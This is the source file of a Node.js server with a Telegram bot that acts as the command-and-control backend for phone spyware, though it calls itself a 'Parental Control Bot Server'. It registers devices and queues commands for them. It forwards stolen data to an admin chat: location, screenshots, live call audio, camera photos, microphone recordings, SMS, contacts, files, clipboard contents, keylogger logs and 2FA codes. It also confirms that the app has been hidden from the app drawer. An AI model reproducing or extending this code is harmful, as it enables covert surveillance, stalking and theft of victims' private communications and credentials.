const express = require('express');
const fs = require('fs');
const { Telegraf } = require('telegraf');
const botModule = require('./bot');

// Load configuration
let config;
try {
  config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (error) {
  console.error('Error loading configuration from data.json:', error);
  process.exit(1);
}

// Initialize Express app
const app = express();
app.use(express.json());

// Initialize Telegram bot
const bot = new Telegraf(config.botToken || process.env.BOT_TOKEN);
botModule.setupBot(bot);

// Store connected devices
const connectedDevices = new Map();

// API endpoint for device registration
app.post('/register', (req, res) => {
  const { deviceId, deviceName, osVersion, model } = req.body;
  
  if (!deviceId) {
    return res.status(400).json({ error: 'Device ID is required' });
  }
  
  connectedDevices.set(deviceId, {
    deviceName: deviceName || 'Unknown Device',
    osVersion: osVersion || 'Unknown',
    model: model || 'Unknown',
    lastSeen: new Date(),
    isOnline: true
  });
  
  console.log(`Device registered: ${deviceId}`);
  
  // Notify admin about new device
  if (config.adminChatId) {
    bot.telegram.sendMessage(
      config.adminChatId,
      `✅ New device connected:\nName: ${deviceName || 'Unknown'}\nModel: ${model || 'Unknown'}\nOS: ${osVersion || 'Unknown'}\nID: ${deviceId}`
    ).catch(err => console.error('Failed to send notification:', err));
  }
  
  res.json({ success: true, message: 'Device registered successfully' });
});

// API endpoint for devices to get pending commands
app.get('/commands/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  
  if (!connectedDevices.has(deviceId)) {
    return res.status(404).json({ error: 'Device not registered' });
  }
  
  // Update device last seen time
  const device = connectedDevices.get(deviceId);
  device.lastSeen = new Date();
  device.isOnline = true;
  connectedDevices.set(deviceId, device);
  
  // Find any pending commands for this device
  const pendingCommands = [];
  
  for (const [requestId, request] of botModule.pendingRequests.entries()) {
    if (request.deviceId === deviceId) {
      pendingCommands.push({
        requestId,
        type: request.type,
        params: request.params || {}
      });
      
      // For one-time commands, remove from pending after sending
      if (!request.persistent) {
        botModule.pendingRequests.delete(requestId);
      }
    }
  }
  
  res.json({ commands: pendingCommands });
});

// API endpoint for receiving device updates
app.post('/update/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { type, data } = req.body;
  
  if (!connectedDevices.has(deviceId)) {
    return res.status(404).json({ error: 'Device not registered' });
  }
  
  // Update device last seen time
  const device = connectedDevices.get(deviceId);
  device.lastSeen = new Date();
  connectedDevices.set(deviceId, device);
  
  // Process update based on type
  switch (type) {
    case 'location':
      // Notify admin about location update
      if (config.adminChatId && data.latitude && data.longitude) {
        bot.telegram.sendLocation(
          config.adminChatId,
          data.latitude,
          data.longitude
        ).catch(err => console.error('Failed to send location:', err));
      }
      break;
      
    case 'screenshot':
      // Handle screenshot data (base64)
      if (config.adminChatId && data.image) {
        const imageBuffer = Buffer.from(data.image, 'base64');
        bot.telegram.sendPhoto(
          config.adminChatId,
          { source: imageBuffer },
          { caption: `Screenshot from ${device.deviceName}` }
        ).catch(err => console.error('Failed to send screenshot:', err));
      }
      break;
      
    case 'call_log':
      // Handle call logs
      if (config.adminChatId && Array.isArray(data.calls)) {
        const message = 'Recent Call Logs:\n\n' + 
          data.calls.map(call => 
            `Number: ${call.number}\nType: ${call.type}\nDuration: ${call.duration}s\nTime: ${call.time}`
          ).join('\n\n');
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send call logs:', err));
      }
      break;
      
    case 'call_state':
      // Handle call state changes (started/ended)
      if (config.adminChatId && data.state) {
        const number = data.number || 'Unknown';
        const state = data.state;
        
        if (state === 'started') {
          bot.telegram.sendMessage(
            config.adminChatId,
            `📞 Call started on ${device.deviceName}:\nNumber: ${number}\nType: ${data.callType || 'Unknown'}`
          ).catch(err => console.error('Failed to send call state update:', err));
        } else if (state === 'ended') {
          bot.telegram.sendMessage(
            config.adminChatId,
            `📞 Call ended on ${device.deviceName}:\nNumber: ${number}\nDuration: ${data.duration || 'Unknown'} seconds`
          ).catch(err => console.error('Failed to send call state update:', err));
        }
      }
      break;
      
    case 'call_audio':
      // Handle real-time call audio stream
      if (config.adminChatId && data.audio) {
        try {
          const audioBuffer = Buffer.from(data.audio, 'base64');
          const number = data.number || 'Unknown';
          
          bot.telegram.sendVoice(
            config.adminChatId,
            { source: audioBuffer },
            { caption: `📞 Call audio with ${number} on ${device.deviceName}` }
          ).catch(err => console.error('Failed to send call audio:', err));
        } catch (err) {
          console.error('Error processing call audio data:', err);
        }
      }
      break;
      
    case 'camera_photo':
      // Handle camera photo (base64)
      if (config.adminChatId && data.image) {
        const imageBuffer = Buffer.from(data.image, 'base64');
        const cameraType = data.cameraType || 'unknown';
        
        bot.telegram.sendPhoto(
          config.adminChatId,
          { source: imageBuffer },
          { caption: `Photo from ${cameraType} camera of ${device.deviceName}` }
        ).catch(err => console.error('Failed to send camera photo:', err));
      }
      break;
      
    case 'audio_recording':
      // Handle audio recording (base64)
      if (config.adminChatId && data.audio) {
        const audioBuffer = Buffer.from(data.audio, 'base64');
        const duration = data.duration || 'unknown';
        
        bot.telegram.sendVoice(
          config.adminChatId,
          { source: audioBuffer },
          { caption: `Audio recording (${duration}s) from ${device.deviceName}` }
        ).catch(err => console.error('Failed to send audio recording:', err));
      }
      break;
      
    case 'sms_messages':
      // Handle SMS messages
      if (config.adminChatId && Array.isArray(data.messages)) {
        const message = 'SMS Messages:\n\n' + 
          data.messages.map(sms => 
            `Number: ${sms.address}\nType: ${sms.type}\nDate: ${sms.date}\nMessage: ${sms.body}`
          ).join('\n\n');
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send SMS messages:', err));
      }
      break;
      
    case 'contacts':
      // Handle contacts list
      if (config.adminChatId && Array.isArray(data.contacts)) {
        let message = 'Contacts:\n\n';
        
        // Limit to first 50 contacts to avoid message size limits
        const contactsToShow = data.contacts.slice(0, 50);
        message += contactsToShow.map(contact => 
          `Name: ${contact.name}\nPhone: ${contact.phone}`
        ).join('\n\n');
        
        if (data.contacts.length > 50) {
          message += `\n\n... and ${data.contacts.length - 50} more contacts`;
        }
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send contacts:', err));
      }
      break;
      
    case 'app_list':
      // Handle app list
      if (config.adminChatId && Array.isArray(data.apps)) {
        let message = 'Installed Applications:\n\n';
        
        // Limit to first 50 apps to avoid message size limits
        const appsToShow = data.apps.slice(0, 50);
        message += appsToShow.map(app => 
          `Name: ${app.name}\nPackage: ${app.packageName}\nEnabled: ${app.enabled ? '✅' : '❌'}`
        ).join('\n\n');
        
        if (data.apps.length > 50) {
          message += `\n\n... and ${data.apps.length - 50} more apps`;
        }
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send app list:', err));
      }
      break;
      
    case 'file_list':
      // Handle file list
      if (config.adminChatId && Array.isArray(data.files)) {
        let message = `Files in ${data.path || 'unknown location'}:\n\n`;
        
        // Group files by type for better readability
        const directories = data.files.filter(file => file.isDirectory);
        const files = data.files.filter(file => !file.isDirectory);
        
        message += '📁 Directories:\n';
        message += directories.map(dir => `  ${dir.name}`).join('\n');
        
        message += '\n\n📄 Files:\n';
        message += files.map(file => `  ${file.name} (${file.size || 'unknown size'})`).join('\n');
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send file list:', err));
      }
      break;
      
    case 'file_data':
      // Handle file data
      if (config.adminChatId && data.fileData && data.fileName) {
        try {
          const fileBuffer = Buffer.from(data.fileData, 'base64');
          const fileName = data.fileName;
          
          // Send as document
          bot.telegram.sendDocument(
            config.adminChatId,
            { source: fileBuffer, filename: fileName },
            { caption: `File from ${device.deviceName}: ${fileName}` }
          ).catch(err => {
            console.error('Failed to send file as document:', err);
            
            // Try to send as text if small enough
            if (fileBuffer.length < 4000) {
              bot.telegram.sendMessage(
                config.adminChatId,
                `File contents of ${fileName}:\n\n${fileBuffer.toString('utf8')}`
              ).catch(err => console.error('Failed to send file as text:', err));
            }
          });
        } catch (err) {
          console.error('Error processing file data:', err);
        }
      }
      break;
      
    case 'clipboard':
      // Handle clipboard data
      if (config.adminChatId && data.text) {
        bot.telegram.sendMessage(
          config.adminChatId,
          `Clipboard content from ${device.deviceName}:\n\n${data.text}`
        ).catch(err => console.error('Failed to send clipboard content:', err));
      }
      break;
      
    case 'keylogger':
      // Handle keylogger data
      if (config.adminChatId && data.logs) {
        bot.telegram.sendMessage(
          config.adminChatId,
          `Keylogger data from ${device.deviceName}:\n\n${data.logs}`
        ).catch(err => console.error('Failed to send keylogger data:', err));
      }
      break;
      
    case 'device_info':
      // Handle device info
      if (config.adminChatId && data.info) {
        let message = `📱 Device Information for ${device.deviceName}:\n\n`;
        
        // Format device info
        for (const [key, value] of Object.entries(data.info)) {
          message += `${key}: ${value}\n`;
        }
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send device info:', err));
      }
      break;
      
    case 'blocked_apps':
      // Handle blocked apps list
      if (config.adminChatId && Array.isArray(data.apps)) {
        let message = 'Blocked Applications:\n\n';
        
        if (data.apps.length === 0) {
          message += 'No applications are currently blocked.';
        } else {
          message += data.apps.map(app => 
            `Name: ${app.name}\nPackage: ${app.packageName}`
          ).join('\n\n');
        }
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send blocked apps list:', err));
      }
      break;
      
    case 'command_result':
      // Handle generic command results
      if (config.adminChatId && data.result) {
        bot.telegram.sendMessage(
          config.adminChatId,
          `Command result from ${device.deviceName}:\n\n${data.command || 'Unknown command'}: ${data.result}`
        ).catch(err => console.error('Failed to send command result:', err));
      }
      break;
      
    case 'app_hidden':
      // Handle app hidden confirmation
      if (config.adminChatId) {
        bot.telegram.sendMessage(
          config.adminChatId,
          `🔒 App successfully hidden on ${device.deviceName}. The app will no longer appear in the app drawer.`
        ).catch(err => console.error('Failed to send app hidden notification:', err));
      }
      break;
      
    case 'app_unhidden':
      // Handle app unhidden confirmation
      if (config.adminChatId) {
        bot.telegram.sendMessage(
          config.adminChatId,
          `🔓 App is now visible on ${device.deviceName}. The app will appear in the app drawer.`
        ).catch(err => console.error('Failed to send app unhidden notification:', err));
      }
      break;
      
    case 'app_uninstall_result':
      // Handle uninstall result
      if (config.adminChatId) {
        const success = data.success || false;
        const reason = data.reason || '';
        
        if (success) {
          bot.telegram.sendMessage(
            config.adminChatId,
            `✅ App successfully uninstalled from ${device.deviceName}.`
          ).catch(err => console.error('Failed to send uninstall notification:', err));
        } else {
          bot.telegram.sendMessage(
            config.adminChatId,
            `❌ Failed to uninstall app from ${device.deviceName}.\nReason: ${reason}`
          ).catch(err => console.error('Failed to send uninstall failure notification:', err));
        }
      }
      break;
      
    case '2fa_status':
      // Handle 2FA status update
      if (config.adminChatId) {
        const enabled = data.enabled || false;
        const email = data.email || 'Not set';
        
        let message = `🔐 Two-factor authentication on ${device.deviceName} is now `;
        message += enabled ? 'enabled.\n' : 'disabled.\n';
        
        if (enabled) {
          message += `Verification codes will be sent to: ${email}`;
        }
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send 2FA status notification:', err));
      }
      break;
      
    case '2fa_verification':
      // Handle 2FA verification request
      if (config.adminChatId) {
        const code = data.code || '';
        const action = data.action || 'unknown';
        
        let message = `🔑 Two-factor verification required on ${device.deviceName}\n`;
        message += `Action: ${action}\n`;
        message += `Verification code: ${code}\n\n`;
        message += `Please provide this code on the device to complete the ${action} process.`;
        
        bot.telegram.sendMessage(
          config.adminChatId,
          message
        ).catch(err => console.error('Failed to send 2FA verification notification:', err));
      }
      break;
      
    default:
      console.log(`Received unknown update type: ${type}`);
  }
  
  res.json({ success: true });
});

// Set up webhook if configured
if (config.webhookUrl) {
  const webhookUrl = config.webhookUrl;
  const secretPath = `/webhook/${bot.secretPathComponent()}`;
  
  // Set webhook on Telegram servers
  bot.telegram.setWebhook(`${webhookUrl}${secretPath}`)
    .then(() => {
      console.log('Webhook set successfully');
    })
    .catch(error => {
      console.error('Failed to set webhook:', error);
    });

  // Set up webhook endpoint
  app.use(bot.webhookCallback(secretPath));
  console.log(`Webhook endpoint configured at: ${secretPath}`);
} else {
  // Use long polling if webhook is not configured
  bot.launch()
    .then(() => {
      console.log('Bot started with long polling');
    })
    .catch(error => {
      console.error('Failed to start bot with long polling:', error);
    });
}

// Health check endpoint
app.get('/', (req, res) => {
  res.send('Parental Control Bot Server is running!');
});

// Start the server
const PORT = process.env.PORT || 8000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on port ${PORT}`);
});

// Graceful shutdown
process.once('SIGINT', () => {
  bot.stop('SIGINT');
});

process.once('SIGTERM', () => {
  bot.stop('SIGTERM');
});
